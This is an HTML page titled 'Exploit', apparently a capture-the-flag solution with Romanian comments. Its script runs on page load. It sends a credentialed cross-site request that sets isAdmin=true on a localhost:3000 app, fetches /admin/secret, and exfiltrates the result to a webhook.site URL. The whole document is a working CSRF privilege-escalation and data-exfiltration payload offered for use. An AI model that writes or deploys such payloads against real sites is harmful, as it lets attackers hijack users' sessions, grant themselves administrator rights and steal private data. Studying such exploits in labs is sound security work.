<!DOCTYPE html>
<html>
<head>
  <title>Exploit</title>
</head>
<body>
  <script>
    const TARGET = 'http://localhost:3000';
    const WEBHOOK = 'https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23';

    async function exploit() {
      // Pas 1: Setam isAdmin=true
      await fetch(`${TARGET}/update-profile`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'isAdmin=true',
        credentials: 'include'
      });

      // Pas 2: Luam secretul
      const res = await fetch(`${TARGET}/admin/secret`, {
        credentials: 'include'
      });
      const flag = await res.text();

      // Pas 3: Exfiltram
      fetch(`${WEBHOOK}?flag=${encodeURIComponent(flag)}`);
    }

    exploit();
  </script>
</body>
</html>
